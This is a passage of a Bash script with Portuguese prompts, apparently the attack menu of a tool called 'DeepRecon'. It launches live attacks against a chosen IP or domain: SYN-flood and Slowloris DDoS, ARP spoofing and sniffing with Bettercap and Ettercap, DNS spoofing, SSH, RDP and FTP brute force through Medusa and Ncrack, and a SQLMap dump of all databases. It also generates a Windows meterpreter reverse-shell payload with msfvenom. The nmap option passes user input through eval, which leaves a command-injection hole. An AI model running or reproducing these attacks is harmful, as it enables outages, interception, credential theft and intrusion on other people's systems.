        cd "$HOME/DDoS-Ripper" 2>/dev/null && python3 DRipper.py -s "$ALVO_IP" -p 80 -t 135
      fi
    else
      echo -e "\n${RED}[!] IP nao encontrado${RESET}"
    fi ;;
  2) # hping3 SYN Flood
    if [ -n "$ALVO_IP" ] && command -v hping3 &>/dev/null; then
      echo ""
      echo -e "${RED}╔══════════════════════════════════════════════════╗${RESET}"
      echo -e "${RED}║        hping3 - SYN Flood DDoS                  ║${RESET}"
      echo -e "${RED}╠══════════════════════════════════════════════════╣${RESET}"
      echo -e "${RED}║${RESET}  ${YELLOW}Alvo: $ALVO_IP${RESET}"
      echo -e "${RED}║${RESET}"
      printf "${RED}Confirmar SYN Flood contra $ALVO_IP? (s/N): ${RESET}"; read -r CONFIRMA
      if [ "$CONFIRMA" = "s" ] || [ "$CONFIRMA" = "S" ]; then
        echo -e "\n${RED}[!] CTRL+C para parar${RESET}\n"
        sudo hping3 -S --flood -p 80 "$ALVO_IP"
      fi
    else
      echo -e "\n${RED}[!] hping3 nao disponivel ou IP nao encontrado${RESET}"
    fi ;;
  3) # SlowHTTPTest
    if [ -n "$DOMINIO" ] && command -v slowhttptest &>/dev/null; then
      echo ""
      echo -e "${RED}╔══════════════════════════════════════════════════╗${RESET}"
      echo -e "${RED}║     SlowHTTPTest - Slowloris Attack             ║${RESET}"
      echo -e "${RED}╠══════════════════════════════════════════════════╣${RESET}"
      echo -e "${RED}║${RESET}  ${YELLOW}Alvo: $DOMINIO${RESET}"
      echo -e "${RED}║${RESET}"
      printf "${RED}Confirmar SlowHTTP contra $DOMINIO? (s/N): ${RESET}"; read -r CONFIRMA
      if [ "$CONFIRMA" = "s" ] || [ "$CONFIRMA" = "S" ]; then
        echo -e "\n${RED}[!] CTRL+C para parar${RESET}\n"
        slowhttptest -c 1000 -H -g -o ~/slowhttp_report -i 10 -r 200 -t GET -u "http://$DOMINIO" -x 24 -p 3
      fi
    else
      echo -e "\n${RED}[!] slowhttptest nao disponivel${RESET}"
    fi ;;
  4) # Bettercap
    if [ -n "$ALVO_IP" ] && command -v bettercap &>/dev/null; then
      echo ""
      echo -e "${RED}╔══════════════════════════════════════════════════╗${RESET}"
      echo -e "${RED}║     Bettercap - MITM / Sniffing                 ║${RESET}"
      echo -e "${RED}╠══════════════════════════════════════════════════╣${RESET}"
      echo -e "${RED}║${RESET}  ${YELLOW}Alvo: $ALVO_IP${RESET}"
      echo -e "${RED}║${RESET}"
      echo -e "${RED}║${RESET}  ${CYAN}1 - Sniff HTTP${RESET}"
      echo -e "${RED}║${RESET}  ${CYAN}2 - ARP Spoof${RESET}"
      echo -e "${RED}║${RESET}  ${CYAN}3 - Menu completo${RESET}"
      echo -e "${RED}║${RESET}"
      printf "${YELLOW}Bettercap opcao (1-3): ${RESET}"; read -r BCAP
      case $BCAP in
        1) echo -e "\n${GREEN}[+] Sniffing HTTP em $ALVO_IP... CTRL+C para parar${RESET}\n"
           sudo bettercap -eval "set arp.spoof.targets $ALVO_IP; arp.spoof on; net.sniff on" ;;
        2) echo -e "\n${GREEN}[+] ARP Spoof em $ALVO_IP... CTRL+C para parar${RESET}\n"
           sudo bettercap -eval "set arp.spoof.targets $ALVO_IP; arp.spoof on" ;;
        3) echo -e "\n${GREEN}[+] Bettercap interativo${RESET}\n"
           sudo bettercap ;;
      esac
    else
      echo -e "\n${RED}[!] bettercap nao disponivel ou IP nao encontrado${RESET}"
    fi ;;
  5) # Metasploit
    if command -v msfconsole &>/dev/null; then
      echo ""
      echo -e "${RED}╔══════════════════════════════════════════════════╗${RESET}"
      echo -e "${RED}║      Metasploit - Exploit Suggester              ║${RESET}"
      echo -e "${RED}╠══════════════════════════════════════════════════╣${RESET}"
      echo -e "${RED}║${RESET}  ${CYAN}1 - Auto-exploit (db_nmap + suggester)${RESET}"
      echo -e "${RED}║${RESET}  ${CYAN}2 - Console interativa${RESET}"
      echo -e "${RED}║${RESET}  ${CYAN}3 - Payload Windows reverse TCP${RESET}"
      echo -e "${RED}║${RESET}"
      printf "${YELLOW}Opcao (1-3): ${RESET}"; read -r MSF_OPT
      case $MSF_OPT in
        1) echo -e "\n${GREEN}[+] Rodando exploit suggester contra $ALVO_IP...${RESET}\n"
           if [ -n "$ALVO_IP" ]; then
             msfconsole -q -x "workspace -a DeepRecon; db_nmap -sV $ALVO_IP; services; vulns; run post/multi/recon/local_exploit_suggester; exit" -y
           else
             echo -e "${RED}[!] IP do alvo necessario${RESET}"
           fi ;;
        2) echo -e "\n${GREEN}[+] Metasploit interativo. Use 'exit' para voltar.${RESET}\n"
           msfconsole -q ;;
        3) echo -e "\n${GREEN}[+] Gerando payload Windows reverse TCP...${RESET}"
           printf "LHOST: "; read -r LHOST
           printf "LPORT (4444): "; read -r LPORT
           [ -z "$LPORT" ] && LPORT=4444
           msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o ~/payload.exe
           echo -e "${GREEN}[+] Payload salvo em ~/payload.exe${RESET}" ;;
      esac
    else
      echo -e "\n${RED}[!] msfconsole nao disponivel${RESET}"
    fi ;;
  6) # Medusa
    if command -v medusa &>/dev/null && [ -n "$ALVO_IP" ]; then
      echo ""
      echo -e "${RED}╔══════════════════════════════════════════════════╗${RESET}"
      echo -e "${RED}║       Medusa - Brute Force Multifluxo            ║${RESET}"
      echo -e "${RED}╠══════════════════════════════════════════════════╣${RESET}"
      echo -e "${RED}║${RESET}  ${CYAN}Servicos: ftp, ssh, http, mysql, smb${RESET}"
      echo -e "${RED}║${RESET}"
      printf "Servico alvo (ex: ssh): "; read -r MED_SERV
      printf "Usuario (ex: root/admin): "; read -r MED_USER
      echo -e "\n${YELLOW}[!] Testando $MED_SERV em $ALVO_IP como $MED_USER...${RESET}"
      echo -e "${YELLOW}[!] Use /usr/share/wordlists/ para senhas${RESET}\n"
      echo -e "${GREEN}[+] medusa -h $ALVO_IP -u $MED_USER -P <wordlist> -M $MED_SERV${RESET}"
      printf "${YELLOW}Caminho wordlist: ${RESET}"; read -r MED_WL
      [ -n "$MED_WL" ] && [ -f "$MED_WL" ] && {
        echo -e "\n${RED}[!] CTRL+C para parar${RESET}\n"
        sudo medusa -h "$ALVO_IP" -u "$MED_USER" -P "$MED_WL" -M "$MED_SERV"
      } || echo -e "${RED}[!] Wordlist invalida${RESET}"
    else
      echo -e "\n${RED}[!] medusa nao disponivel ou IP nao encontrado${RESET}"
    fi ;;
  7) # Ncrack
    if command -v ncrack &>/dev/null && [ -n "$ALVO_IP" ]; then
      echo ""
      echo -e "${RED}╔══════════════════════════════════════════════════╗${RESET}"
      echo -e "${RED}║       Ncrack - Brute Force RDP/SSH              ║${RESET}"
      echo -e "${RED}╠══════════════════════════════════════════════════╣${RESET}"
      echo -e "${RED}║${RESET}  ${CYAN}1 - SSH brute force${RESET}"
      echo -e "${RED}║${RESET}  ${CYAN}2 - RDP brute force${RESET}"
      echo -e "${RED}║${RESET}  ${CYAN}3 - FTP brute force${RESET}"
      echo -e "${RED}║${RESET}"
      printf "Opcao (1-3): "; read -r NC_OPT
      local NC_PORT=""; local NC_SVC=""
      case $NC_OPT in
        1) NC_PORT=22; NC_SVC="ssh" ;;
        2) NC_PORT=3389; NC_SVC="rdp" ;;
        3) NC_PORT=21; NC_SVC="ftp" ;;
      esac
      if [ -n "$NC_PORT" ]; then
        echo -e "\n${YELLOW}[!] Ataque $NC_SVC em $ALVO_IP:$NC_PORT${RESET}"
        printf "Usuario (ex: administrator): "; read -r NC_USER
        echo -e "${GREEN}[+] ncrack -v -U <users> -P <pass> $ALVO_IP:$NC_PORT${RESET}"
        printf "${YELLOW}Caminho wordlist senhas: ${RESET}"; read -r NC_WL
        [ -n "$NC_WL" ] && [ -f "$NC_WL" ] && {
          echo -e "\n${RED}[!] CTRL+C para parar${RESET}\n"
          sudo ncrack -v -U <(echo "$NC_USER") -P "$NC_WL" "$ALVO_IP:$NC_PORT"
        } || echo -e "${RED}[!] Wordlist invalida${RESET}"
      else
        echo -e "\n${RED}[!] Opcao invalida${RESET}"
      fi
    else
      echo -e "\n${RED}[!] ncrack nao disponivel ou IP nao encontrado${RESET}"
    fi ;;
  8) # Ettercap
    if command -v ettercap &>/dev/null && [ -n "$ALVO_IP" ]; then
      echo ""
      echo -e "${RED}╔══════════════════════════════════════════════════╗${RESET}"
      echo -e "${RED}║       Ettercap - MITM Avancado                   ║${RESET}"
      echo -e "${RED}╠══════════════════════════════════════════════════╣${RESET}"
      echo -e "${RED}║${RESET}  ${CYAN}1 - ARP poison + snif (texto)${RESET}"
      echo -e "${RED}║${RESET}  ${CYAN}2 - ARP poison + snif (GUI)${RESET}"
      echo -e "${RED}║${RESET}  ${CYAN}3 - DNS spoof${RESET}"
      echo -e "${RED}║${RESET}"
      printf "Opcao (1-3): "; read -r ET_OPT
      case $ET_OPT in
        1) echo -e "\n${GREEN}[+] Ettercap em modo texto contra $ALVO_IP...${RESET}\n"
           sudo ettercap -T -M arp:remote /"$ALVO_IP"// ;;
        2) echo -e "\n${GREEN}[+] Ettercap em modo GUI...${RESET}\n"
           sudo ettercap -G ;;
        3) echo -e "\n${GREEN}[+] DNS spoofing...${RESET}"
           echo -e "${YELLOW}[!] Configure /etc/ettercap/etter.dns primeiro${RESET}\n"
           sudo ettercap -T -M arp:remote /"$ALVO_IP"// -P dns_spoof ;;
      esac
    else
      echo -e "\n${RED}[!] ettercap nao disponivel ou IP nao encontrado${RESET}"
    fi ;;
  9) # SQLMap
    if command -v sqlmap &>/dev/null && [ -n "$ALVO" ]; then
      echo ""
      echo -e "${RED}╔══════════════════════════════════════════════════╗${RESET}"
      echo -e "${RED}║       SQLMap - SQL Injection Direto              ║${RESET}"
      echo -e "${RED}╠══════════════════════════════════════════════════╣${RESET}"
      echo -e "${RED}║${RESET}  ${CYAN}1 - Scan rapido (--batch)${RESET}"
      echo -e "${RED}║${RESET}  ${CYAN}2 - Dump tudo (agressivo)${RESET}"
      echo -e "${RED}║${RESET}  ${CYAN}3 - Modo expert (personalizado)${RESET}"
      echo -e "${RED}║${RESET}"
      printf "Opcao (1-3): "; read -r SQL_OPT
      echo ""
      case $SQL_OPT in
        1) echo -e "${YELLOW}[!] SQLMap scan rapido em $ALVO${RESET}\n"
           sqlmap -u "$ALVO" --batch --random-agent --level 2 --risk 2 2>/dev/null | head -30
           echo -e "\n${GREEN}[+] Relatorio salvo em ~/.local/share/sqlmap/output/${RESET}" ;;
        2) echo -e "${RED}[!] SQLMap DUMP - Pode consumir recursos!${RESET}"
           printf "${RED}Confirmar dump de todos os DBs? (s/N): ${RESET}"; read -r CONFIRMA
           [ "$CONFIRMA" = "s" ] || [ "$CONFIRMA" = "S" ] && {
             echo -e "\n${RED}[!] CTRL+C para parar${RESET}\n"
             sqlmap -u "$ALVO" --batch --random-agent --threads 5 --dump-all 2>/dev/null | head -50
           } ;;
        3) echo -e "${CYAN}[i] SQLMap modo expert: digite parametros extras${RESET}"
           echo -e "${CYAN}    Ex: --data 'user=1' --cookie 'PHPSESSID=x' --level 5${RESET}"
           printf "Parametros extras: "; read -r SQL_EXTRA
           echo -e "\n${RED}[!] CTRL+C para parar${RESET}\n"
           sqlmap -u "$ALVO" --batch --random-agent $SQL_EXTRA 2>/dev/null | head -50 ;;
      esac
    else
      echo -e "\n${RED}[!] sqlmap nao disponivel ou URL invalida${RESET}"
    fi ;;
  10) # Nmap
    if command -v nmap &>/dev/null && [ -n "$ALVO_IP" ]; then
      echo ""
      echo -e "${RED}╔══════════════════════════════════════════════════╗${RESET}"
      echo -e "${RED}║       Nmap - Scan Personalizado                  ║${RESET}"
      echo -e "${RED}╠══════════════════════════════════════════════════╣${RESET}"
      echo -e "${RED}║${RESET}  ${CYAN}1 - Scan rapido (top 100 portas)${RESET}"
      echo -e "${RED}║${RESET}  ${CYAN}2 - Scan completo (todas portas)${RESET}"
      echo -e "${RED}║${RESET}  ${CYAN}3 - Scan servicos + OS detect${RESET}"
      echo -e "${RED}║${RESET}  ${CYAN}4 - Comando personalizado${RESET}"
      echo -e "${RED}║${RESET}"
      printf "Opcao (1-4): "; read -r NM_OPT
      echo ""
      case $NM_OPT in
        1) echo -e "${GREEN}[+] nmap -T4 --top-ports 100 $ALVO_IP${RESET}\n"
           sudo nmap -T4 --top-ports 100 "$ALVO_IP" 2>/dev/null ;;
        2) echo -e "${YELLOW}[!] Scan completo em $ALVO_IP (pode demorar)${RESET}\n"
           sudo nmap -T4 -p- "$ALVO_IP" 2>/dev/null ;;
        3) echo -e "${GREEN}[+] nmap -sV -O --traceroute $ALVO_IP${RESET}\n"
           sudo nmap -sV -O --traceroute "$ALVO_IP" 2>/dev/null ;;
        4) printf "${YELLOW}Digite o comando nmap: ${RESET}"; read -r NM_CMD
           [ -n "$NM_CMD" ] && {
             echo -e "\n${GREEN}[+] nmap $NM_CMD $ALVO_IP${RESET}\n"
             eval "sudo nmap $NM_CMD \"$ALVO_IP\"" 2>/dev/null
           } || echo -e "${RED}[!] Comando vazio${RESET}" ;;
      esac
    else
      echo -e "\n${RED}[!] nmap nao disponivel ou IP nao encontrado${RESET}"
    fi ;;
  *|0)
    echo -e "\n${BLUE}[i] Saindo do menu de ataque...${RESET}" ;;
esac
echo ""

# Mostra o relatorio completo apos o menu de ataque
echo ""
echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${CYAN}${BOLD}║         RELATORIO DO SCAN - DeepRecon          ║${RESET}"
echo -e "${CYAN}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}Alvo:${RESET}  $ALVO"
echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}Data:${RESET}  $(date '+%d/%m/%Y %H:%M')"
echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
echo ""
[ -f "$REPORT" ] && cat "$REPORT" 2>/dev/null || echo -e "${YELLOW}[!] Relatorio nao encontrado${RESET}"

# Trunca relatorio se exceder limite (seguranca contra estouro de disco)
[ -f "$REPORT" ] && [ "$(stat -c%s "$REPORT" 2>/dev/null || echo 0)" -gt "$MAX_OUTPUT_BYTES" ] && {
  head -c "$MAX_OUTPUT_BYTES" "$REPORT" > "${REPORT}.trim" 2>/dev/null && mv "${REPORT}.trim" "$REPORT" 2>/dev/null
  aviso "Relatorio truncado para ${MAX_OUTPUT_BYTES} bytes (use JSON/HTML para dados completos)"
}

done
